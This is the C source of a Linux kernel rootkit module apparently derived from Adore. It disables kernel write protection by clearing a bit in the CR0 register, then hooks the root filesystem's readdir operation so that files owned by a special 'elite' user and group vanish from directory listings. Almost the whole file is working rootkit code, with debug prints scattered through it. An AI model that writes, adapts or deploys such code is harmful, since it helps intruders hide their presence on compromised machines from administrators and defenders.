#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <asm/unistd.h>

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/capability.h>
#include <linux/spinlock.h>
#include <linux/pid.h>
#include <linux/init.h>
#include <linux/seq_file.h>

#include <net/sock.h>
#include <net/tcp.h>
#include <linux/un.h>
#include <net/af_unix.h>
#include <linux/aio.h>
#include <linux/list.h>
#include <linux/sysfs.h>

#include "my_rootkit.h"
#include "hide_file.h"

//#include <linux/modversions.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 0)
#define LINUX26
#endif
#ifdef LINUX26
/*code in 3.2 kernel*/
char *root_fs = "/";                /* default FS to hide files */
typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_root_readdir = NULL;
struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *, struct nameidata *) = NULL;                                  
filldir_t root_filldir = NULL;
struct super_block *root_sb[1024];

void setback_cr0(unsigned int val)
{
    asm volatile("movl %%eax, %%cr0"
               :
               : "a"(val)
               );
}
 
unsigned int clear_cr0_save(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	__asm__ __volatile__ ("movl %%cr0, %%eax":"=a"(cr0));
	ret = cr0;

	cr0 &= 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
	return ret;
}

int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct inode *inode = NULL;
	int r = 0;
	uid_t uid;
	gid_t gid;
	char reiser = 0;
	
	printk(KERN_ALERT"current->pid=%d\n", current->pid);
	//return 0;
	
	if (!root_sb[current->pid%1024])
		return 0;

	/* There's an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
	 * without the unlock_new_inode() doesn't crash, but deadlocks
	 * time to time. So I basically emulate iget() without
	 * the sb->s_op->read_inode(inode); and so it doesn't crash or deadlock.
	 */
	reiser = (strcmp(root_sb[current->pid%1024]->s_type->name, "reiserfs") == 0);
	if (reiser) {
		printk(KERN_ALERT"reiser\n");
		if ((inode = iget_locked(root_sb[current->pid%1024], ino)) == NULL)
			return 0;
	} else {
		printk(KERN_ALERT"no reiser\n");
		if ((inode = iget_locked(root_sb[current->pid%1024], ino)) == NULL)
			return 0;
	}

	uid = inode->i_uid;
	gid = inode->i_gid;
	printk(KERN_ALERT"uid=%d,gid=%d\n", uid, gid);
	//if (reiser) {
	if (inode->i_state & I_NEW)
		unlock_new_inode(inode);
	//}
	iput(inode);
	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		printk(KERN_ALERT"hide success\n");
		r = 0;
	} else if (root_filldir) {
		r = root_filldir(buf, name, nlen, off, ino, x);
	}
	return r;
}
int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf || !filldir || !orig_root_readdir)
		return 0;

	root_filldir = filldir;
	root_sb[current->pid%1024] = fp->f_vfsmnt->mnt_sb;
	r = orig_root_readdir(fp, buf, (filldir_t)adore_root_filldir);

	return r;
}
int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file *filep;
	
	printk(KERN_ALERT"patch_vfs: begin\n");
	
	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
		return -1;
	}
	
	printk(KERN_ALERT"patch_vfs: filep_open ok\n");
	
	if (orig_readdir)
		*orig_readdir = ((struct file_operations *)(filep->f_op))->readdir;
	
	printk(KERN_ALERT "orig_addr=0x%8x, orig_addr=0x%8x, new_addr=0x%8x\n", (unsigned int)*orig_readdir, (unsigned int)((struct file_operations *)(filep->f_op))->readdir, (unsigned int)new_readdir);
	
	((struct file_operations *)(filep->f_op))->readdir = new_readdir;
	
	printk(KERN_ALERT"patch_vfs: change f_op ok\n");
	
	filp_close(filep, 0);
	printk(KERN_ALERT"patch_vfs: end\n");
	return 0;
}
int unpatch_vfs(const char *p, readdir_t orig_readdir)
{
	struct file *filep;
	
	printk(KERN_ALERT"unpatch_vfs: begin\n");
	
	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
		return -1;
	}
	
	printk(KERN_ALERT"unpatch_vfs: filep_open ok\n");
	
	printk(KERN_ALERT "l_addr=0x%8x, r_addr=0x%8x\n", (unsigned int)((struct file_operations *)(filep->f_op))->readdir, (unsigned int)orig_readdir);
	
	((struct file_operations *)(filep->f_op))->readdir = orig_readdir;
	printk(KERN_ALERT"unpatch_vfs: change f_op ok\n");
	
	filp_close(filep, 0);
	printk(KERN_ALERT"unpatch_vfs: end\n");
	return 0;
}

//Initialize the module
/*
#define KERN_EMERG    "<0>"    // system is unusable 
#define KERN_ALERT    "<1>"    // action must be taken immediately 
#define KERN_CRIT     "<2>"    // critical conditions 
#define KERN_ERR      "<3>"    // error conditions 
#define KERN_WARNING  "<4>"    // warning conditions 
#define KERN_NOTICE   "<5>"    // normal but significant 
#define KERN_INFO     "<6>"    // informational 
#define KERN_DEBUG    "<7>"    // debug-level messages 
*/
int my_rootkit_init(void)
{
	unsigned int cr0;
	
	my_rootkit_debug(KERN_ALERT "Begin in init_module\n");
	
	cr0 = clear_cr0_save();
	if (-1 == patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir))
		my_rootkit_debug(KERN_DEBUG "Failed to patch_vfs\n");	
	setback_cr0(cr0);
	
	my_rootkit_debug(KERN_ALERT "End in init_module\n");
	return 0;
}
//Exit the module
void my_rootkit_exit(void)
{
	unsigned int cr0;
	my_rootkit_debug(KERN_ALERT "Begin in cleanup_module\n");

	cr0 = clear_cr0_save();
	if (-1 == unpatch_vfs(root_fs, orig_root_readdir))
		my_rootkit_debug(KERN_DEBUG "Failed to unpatch_vfs\n");
	setback_cr0(cr0);
	my_rootkit_debug(KERN_ALERT "End in cleanup_module\n");
}
MODULE_AUTHOR("ChHuWaLi");
MODULE_LICENSE("Dual BSD/GPL");
module_init(my_rootkit_init);
module_exit(my_rootkit_exit);
#else
/*code in 2.4 kernel */
#endif
